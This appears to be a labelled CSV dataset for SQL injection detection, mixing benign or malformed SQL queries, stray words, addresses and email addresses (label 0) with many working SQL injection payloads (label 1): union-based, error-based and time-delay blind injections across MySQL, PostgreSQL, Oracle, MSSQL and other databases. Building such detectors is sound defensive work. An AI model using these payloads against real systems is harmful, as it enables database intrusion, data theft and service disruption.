Sentence,Label
"1'   )    )     )   union all select null,null--",1
pillars4,0
SELECT leave ( s )  FROM rubbed SELECT halfway FROM dark,0
SELECT COUNT ( dependID ) FROM relationship,0
"-9432   )    )    as nqya where 8387  =  8387 or elt  (  9242  =  6180,6180  )  --",1
"1'   )    )     )   union all select null,null,null,null,null,null,null#",1
SELECT thus ( s )  FROM earth LEFT JOIN,0
"1'   )    )    as lizu where 7691  =  7691 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
natala,0
 UPDATE duty SET pocket = 'closely'WHERE product = 'press',0
"1""  )   as zuzm where 1211  =  1211 and elt  (  5458  =  2966,2966  )  --",1
montiel@sitienesunawebtienesunnegocio.cf,0
zacaras,0
"1%""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,1
1   )    )    as rvex where 3462  =  3462 and 4595  =  4595#,1
6653,0
lagunaseca,0
"1'  )   as rqzz where 4987  =  4987 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1
" SELECT * FROM balloon ORDER BY climate, mostly",0
3m6noja4,0
SELECT * FROM across,0
"  UPDATE solve SET load =  'trick', City =  'sense' WHERE citizen =  contain",0
"  SELECT careful,tail,weight FROM wrote LEFT JOIN Orders ON eager.dogID =  past.fine ORDER BY recent.tea",0
SELECT * FROM large  WHERE see NOT LIKE '[mysterious]%',0
scorziel,0
SELECT * FROM swung ORDER BY recent DESC,0
"-9389' where 5713  =  5713 union all select 5713,5713,5713,5713,5713,5713,5713,5713--",1
"cuerlas, las",0
select   (  case when   (  3539  =  8768  )   then 3539 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
SELECT * FROM farther WHERE might = 'neighborhood' FETCH FIRST 3 ROWS ONLY,0
60,0
"  SELECT Orders.streamrID, Employees.run, Employees.wear FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.catID ORDER BY Orders.unusualID",0
SELECT * FROM bright WHERE wooden = 'fresh'  AND City = 'canal',0
colas@ozlon.rs,0
SELECT MIN ( sunlight )  AS region FROM four,0
SELECT blow ( s )  FROM rather SELECT sky ( s ) ,0
deying,0
SELECT * FROM imagine,0
heile,0
"SELECT column1, column2, ... FROM table_name WHERE columnN LIKE pattern ;",0
"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",1
25140,0
suspen3edo7,0
"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",1
SELECT though ( s )  FROM opposite SELECT sure FROM younger,0
SELECT AVG ( angry )  FROM bend  SELECT SUM ( palace ) ,0
SELECT stomach ( s FROM football RIGHT JOIN,0
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""regi"" like ""regi",1
"1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'lwir' like 'lwir",1
"  SELECT redID AS ID, let AS automobile FROM seeing",0
"-8976%""   )    )     )   union all select 5146,5146,5146,5146,5146,5146,5146,5146--",1
SELECT TOP 3 * FROM plenty WHERE dawn = 'conversation',0
"select pg_sleep  (  5  )   and    (    (   ""qani""  =  ""qani",1
SELECT sure FROM silent UNION SELECT sides FROM excellent ORDER BY wing,0
"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",1
"  SELECT * FROM wonderful WHERE silly NOT IN  ( 'cry', 'character', 'rich' )  ",0
SELECT * FROM variety  WHERE law = cross,0
"1"" where 9241  =  9241 union all select null#",1
SELECT * FROM officer WHERE cutting = 'involved' LIMIT 3,0
SELECT character,0
SELECT COUNT ( growth ) FROM soil,0
SELECT COUNT ( giantID ) FROM sick,0
"-6377'||  (  select 'ryin' where 2113  =  2113 union all select 2113,2113,2113#",1
SELECT * FROM felt WHERE cloud = 'tower' LIMIT 3,0
6572,0
SELECT * FROM beginning WHERE many = 'wheat'  AND City = 'goose',0
"-8703'  )   where 9723  =  9723 union all select 9723,9723,9723,9723,9723#",1
SELECT connected ( s ) FROM tightly INNER JOIN,0
SELECT * FROM movement WHERE NOT pour = 'because'  AND NOT being = 'foreign',0
charlot@ringringrent.rw,0
select case when 2930  =  7964 then 1 else null end--,1
32,0
SELECT * FROM made FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM letter,0
80819303v,0
SELECT AVG ( which )  FROM church  SELECT SUM ( flow ) ,0
SELECT MIN ( deep )  AS visitor FROM early,0
rosa,0
obscurantismo,0
c/ comercio 51,0
-9429'  )   order by 1--,1
1940000000000000,0
"INSERT INTO bush  ( industry, require, human )  VALUES  ( 'interior', 'seed', 'satisfied' )  ",0
ginest baquedano,0
select   (  case when   (  3499  =  4209  )   then 3499 else 3499*  (  select 3499 from mysql.db  )   end  )  #,1
"1'   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT well ( s )  FROM nothing LEFT JOIN,0
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'napi' like 'napi,1
83360974g,0
"1'  )   where 8628  =  8628 union all select null,null,null--",1
SELECT * FROM  ( SELECT hand FROM wore ) ,0
"1',  (  select   (  case when   (  5586  =  6403  )   then 1 else 5586*  (  select 5586 from mysql.db  )   end   )    )   ",1
a65esad0,0
nehemiah,0
"1%""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
nakanishi@mariposasentudia.ec,0
heidi,0
"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",1
foulk@eonon.com.es,0
SELECT TOP 3 * FROM moving,0
"-7579%"" or 6570  =  1764",1
"-8725""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""vblw"" like ""vblw",1
wong@hiperespaa.ly,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 347686 )  ORDER BY meta_id ASC",0
"1'+  (  select 'vbqo' where 5630  =  5630 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1""   )    )    as vhrq where 1690  =  1690 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"  SELECT practiceID AS ID, key AS across FROM camp",0
SELECT * FROM powder WHERE NOT brown = 'not'  AND NOT pond = 'soil',0
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1
"1""   )    )    as sqzh where 5672  =  5672 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",1
"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
velero@softwaresaas.ec,0
e7ato,0
" union   (  select NULL, NULL,   (  select @@version   )    )    --",1
1'+  (  select echl where 6593  =  6593 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
al769i4,0
calle codigo correspondencia oficial correos-telegrafos 33,0
SELECT * FROM most  WHERE or = talk,0
SELECT TOP 50 PERCENT * FROM substance SELECT * FROM result FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM blow,0
SELECT TOP 3 * FROM hall WHERE difficulty = 'outer',0
select   (  case when   (  6045  =  2786  )   then 6045 else 1/  (  select 0  )   end  )  --,1
5215,0
"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv",1
SELECT equipment ( s )  FROM obtain LEFT JOIN,0
salhany0,0
1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,1
DELETE FROM agree WHERE burn = 'raise',0
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""cecf""  =  ""cecf",1
1%'   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',1
7288680000000000,0
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
SELECT COUNT ( fly ) FROM series,0
4646930000000000,0
SELECT AVG ( neck ) FROM leader,0
1'+  (  select 'ueak' where 7329  =  7329 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',1
"1,  (  select   (  case when   (  7616  =  7616  )   then 1 else 1/  (  select 0  )   end   )    )   ",1
"calle belen 10, 8a",0
SELECT * FROM third WHERE hold BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM shirt WHERE recognize LIKE '%cover%',0
-4032'  )   where 5157  =  5157 or 1809  =  2810#,1
50408,0
calle velardes s/n 1?e,0
albillos,0
cruey,0
"  SELECT correctly,relationship,bus FROM throat LEFT JOIN Orders ON skill.chapterID =  minerals.cast ORDER BY police.women",0
SELECT * FROM express,0
" SELECT column_name ( s )  FROM vapor,name",0
1' where 4115  =  4115,1
1'+  (  select 'tmel' where 2655  =  2655 rlike   (  select   (  case when   (  2118  =  8500  )   then 1 else 0x28 end   )    )     )  +',1
03t86i3,0
"iif  (  8354  =  3515,1,1/0  )  ",1
SELECT * FROM hardly WHERE    NOT itself = 'trade',0
"1   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
18995930t,0
1   )    )    as mlpf where 7425  =  7425,1
SELECT white ( s )  FROM clearly SELECT excitement ( s ) ,0
granach@mccomptables.be,0
SELECT TOP 3 * FROM sell,0
daochuan,0
vladimirov@saludyfitness.br,0
"   SELECT COUNT ( song ) , exactly FROM out BY ate",0
hammong4@asyra.st,0
"1  )   and elt  (  7425  =  8842,8842  )   and   (  9194  =  9194",1
"  SELECT GREATEST ( 3, 12, 34, 8, 25 ) ;",0
SELECT TOP 3 * FROM page WHERE chest = 'author',0
1%'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  '%'  =  ',1
"c/ caamaque, 15, 4-g",0
"  (  select * from generate_series  (  4990,4990,case when   (  4990  =  5065  )   then 1 else 0 end  )   limit 1  )  ",1
"-6073""   )    )     )   or 9502  =  2012#",1
"1%""  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
SELECT AVG ( effect ) FROM last,0
zarpanel,0
select   (  case when   (  3414  =  8741  )   then 3414 else 3414*  (  select 3414 from information_schema.character_sets  )   end  )  #,1
"1%""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""%""  =  """,1
1'+  (  select dklj where 3265  =  3265,1
"1  )   as wype where 6608  =  6608 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"INSERT INTO rays  ( fog, rising, tall )  VALUES  ( 'rule', 'grabbed', 'been' )  ",0
SELECT * FROM  ( SELECT trade FROM package ) ,0
SELECT * FROM wp_posts WHERE ID  =  292420 LIMIT 1,0
SELECT AVG ( cook ) FROM offer SELECT SUM ( total ) ,0
SELECT president FROM any UNION ALL SELECT this FROM sunlight ORDER BY driver,0
"-2397   )    )    as oizy where 1746  =  1746 union all select 1746,1746,1746,1746,1746,1746#",1
SELECT chemical ( s )  FROM coat UNION,0
espaldilla,0
SELECT TOP 3 * FROM use,0
SELECT AVG ( chance ) FROM happily SELECT SUM ( blanket ) ,0
4341,0
cesana@lasexta-f1.jm,0
valdearcos de la vega,0
"  SELECT YEARWEEK ( ""2017-10-25"" ) ;",0
"1'  )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
2473970000000000,0
SELECT column_name FROM table_name WHERE column_name operator ANY,0
"c/ ereta, 104,",0
"1 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
"1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
9437,0
6g369zar41,0
SELECT * FROM package WHERE slip = 'dozen'  AND City = 'palace',0
SELECT TOP 50 PERCENT * FROM shut SELECT * FROM general FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM three,0
"-4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488--",1
82768054r,0
SELECT Count ( * )  AS driver,0
"  SELECT fellow,fact FROM manufacturing WHERE handsome = 'better' UNION SELECT fireplace, result FROM lamp",0
listeza,0
oviedo,0
SELECT knew ( s FROM belong RIGHT JOIN,0
69054908f,0
SELECT * FROM complex WHERE one LIKE '%cut%',0
-8860  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1
SELECT * FROM facing ORDER BY putting DESC,0
"SELECT * FROM thrown WHERE wore BETWEEN ""selection"" AND    ""took""",0
6180,0
select   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  select 1039 from information_schema.character_sets  )   end  )  #,1
" SELECT * FROM state ORDER BY basis ASC, trouble DESC",0
"1%'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",1
"  SELECT WEEK ( ""2017-06-15"" ) ;",0
-8028%'   )    )     )   or 5042  =  5214,1
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1
"SELECT * FROM love WHERE pour BETWEEN ""period"" AND    ""full""",0
"1"" union all select null#",1
1'  )   and 2305  =  1934,1
SELECT night ( s )  FROM notice UNION,0
"1' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'imqi'  =  'imqi",1
darby,0
select   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  select 7033 from information_schema.character_sets  )   end  )  #,1
"INSERT INTO balance  ( meant, gravity, daily )  VALUES  ( 'let', 'soldier', 'chief' )  ",0
"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",1
"-2901"" or elt  (  9866  =  9099,9099  )   and ""asib"" like ""asib",1
SELECT number FROM may,0
SELECT AVG ( drink ) FROM century,0
SELECT until FROM nobody,0
ambiental,0
"1%""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,1
SELECT AVG ( load ) FROM arrange,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239190 )  ORDER BY meta_id ASC",0
SELECT * FROM cloud WHERE quiet BETWEEN '1996-07-01' AND '1996-07-31',0
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",1
"1' in boolean mode  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #",1
SELECT MIN ( die )  AS nor FROM feel,0
3123820000000000,0
SELECT * FROM than WHERE slipped BETWEEN 'frighten' AND 'keep',0
belva,0
toba,0
1%'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  '%'  =  ',1
FROM  ( SELECT DISTINCT dull FROM basic ) ,0
calle jeremias 14 7b,0
SELECT * FROM interest WHERE composed = 'box'  OR support = 'quick',0
SELECT strike,0
"  SELECT apple AS present, think AS [fifth]  FROM at",0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""layz""  =  ""layz",1
SELECT electric ( s )  FROM equally UNION,0
"  SELECT * FROM independent WHERE forty NOT IN  ( 'rays', 'bone', 'swung' )  ",0
SELECT * FROM pair WHERE Price NOT BETWEEN 10 AND 20,0
8629,0
"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",1
llombai,0
c/ oblit 76,0
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qfvg'  =  'qfvg",1
"-2013""   )    )    as kisy where 3802  =  3802 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
SELECT * FROM degree ORDER BY book DESC,0
 UPDATE collect SET couple = 'battle'WHERE bigger = 'earth',0
SELECT * FROM this  WHERE flag NOT LIKE '[get]%',0
"-8203""  )   union all select 6394,6394,6394,6394,6394--",1
SELECT * FROM thousand WHERE exciting = 'courage' LIMIT 3,0
SELECT * FROM more WHERE discover = 'part'  OR cent = 'silent',0
6091,0
"1%'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   '%'  =  '",1
SELECT zulu ( s )  FROM worried SELECT history FROM crack,0
SELECT * FROM dark WHERE physical BETWEEN '1996-07-01' AND '1996-07-31',0
1  )   as tbve where 4828  =  4828,1
 having 1  =  1--,1
demonlatra,0
"1'  )   union all select null,null,null#",1
spencer,0
SELECT * FROM movie WHERE physical = 'man'  AND City = 'leather',0
SELECT TOP 3 * FROM ought WHERE brain = 'birthday' SELECT * FROM major,0
"1%' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '%'  =  '",1
26707809w,0
"1""   )    )    as uaxn where 5657  =  5657 rlike   (  select   (  case when   (  3548  =  7206  )   then 1 else 0x28 end   )    )   --",1
rub,0
"-8454"" or 6872  =  6872",1
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 181 )  ORDER BY meta_id ASC",0
gloria,0
"-9098' union all select 3476,3476,3476,3476,3476,3476#",1
select   (  case when   (  9986  =  8342  )   then 9986 else 9986*  (  select 9986 from information_schema.character_sets  )   end  )  #,1
longo,0
"-7333%""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,1
"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""oyxk""  =  ""oyxk",1
SELECT * FROM needs  WHERE dangerous NOT LIKE '[occasionally]%',0
"1'  )   where 7640  =  7640 and make_set  (  8978  =  8594,8594  )  --",1
1'||  (  select 'gmkp' where 6016  =  6016,1
2938010000000000,0
teodosio,0
"-9684"" order by 1#",1
SELECT fallen ( s )  FROM roll,0
"1  )   as tgqd where 6369  =  6369 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
5106,0
 UPDATE rise SET screen = 'vote'WHERE powerful = 'coat',0
"1""  )   as dgzf where 4834  =  4834",1
bunyola,0
FROM  ( SELECT DISTINCT cool FROM loss ) ,0
"-5761""  )   or 3762  =  1274",1
"INSERT INTO down  ( myself, important, coal )  VALUES  ( 'while', 'scientific', 'fourth' )  ",0
"   SELECT out, red, bow FROM pressure WHERE information  IS NULL",0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'njnr'  =  'njnr",1
"1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
pesquisar,0
8322,0
SELECT * FROM pile WHERE safe = 'believed' LIMIT 3,0
"   SELECT Employees.can, COUNT ( Orders.afterID )  AS meanFROM    ( OrdersINNER JOIN husband ON Orders.longID  =  Employees.copyID ) ",0
07u8e37ia,0
1'   )    )    as dipp where 1714  =  1714,1
SELECT pictured ( s )  FROM live UNION ALL,0
1'+  (  select bjav where 6923  =  6923 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"   SELECT caught, win+ ', ' + seed+ ' ' + machinery+ ', ' + floor AS waste  FROM consider",0
waitfor delay '0:0:5'# ogzq,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3# kuqm",1
SELECT * FROM feed WHERE decide = 'promised' FETCH FIRST 3 ROWS ONLY,0
roe,0
"SELECT NULLIF ( ""Hello"", ""world"" ) ;",0
1' and 9198  =  9198--,1
"SELECT * FROM band WHERE sad BETWEEN ""cover"" AND    ""without""",0
gowan,0
SELECT AVG ( Price ) FROM friend,0
DELETE FROM function,0
"  SELECT leafID AS ID, date AS position FROM love",0
SELECT COUNT ( headed ) FROM seven,0
SELECT * FROM struggle  WHERE tea = forest,0
SELECT TOP 3 * FROM trunk WHERE great = 'mental' SELECT * FROM trick,0
SELECT TOP 3 * FROM race,0
6490020000000000,0
estiradamente,0
" SELECT * FROM directly ORDER BY thousand ASC, told DESC",0
pg_sleep  (  __TIME__  )  --,1
"1  )   where 5464  =  5464 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq",1
SELECT TOP 3 * FROM copy WHERE out = 'cheese',0
SELECT * FROM sat WHERE NOT beat = 'soon'  AND NOT wire = 'island',0
1%' union all select null--,1
inglis@baltasarsantos.vu,0
8288600000000001,0
terrs triola,0
SELECT AVG ( ate ) FROM wrapped SELECT SUM ( real ) ,0
select   (  case when   (  3537  =  5218  )   then 3537 else 3537*  (  select 3537 from mysql.db  )   end  )  #,1
cha$9i74r0,0
1'+  (  select qpaf where 7859  =  7859 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu   )    )   +',1
SELECT needed ( s )  FROM sets,0
carretera rubi 106,0
1   )    )    as rhwg where 8843  =  8843,1
"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""akha"" like ""akha",1
SELECT * FROM nearer WHERE sitting = 'upward'  AND  ( tree = 'list' OR rope = 'body' ) ,0
SELECT TOP 3 * FROM keep SELECT * FROM nearby 3SELECT * FROM improve,0
SELECT * FROM still WHERE figure = 'steep'  OR surface = 'series',0
5867,0
DELETE FROM page,0
"1%"" and 4595  =  4595#",1
"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
"1""  )   union all select null,null,null,null,null--",1
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",1
44432,0
claudine,0
1571430000000000,0
burns-gerron@100mbps.ht,0
planthar,0
511amasa,0
pelamen,0
SELECT future ( s FROM hunt RIGHT JOIN,0
1'  )   where 2120  =  2120,1
zazulak,0
SELECT COUNT ( DISTINCT him )  FROM thou,0
"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",1
1'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   'gjja'  =  'gjja,1
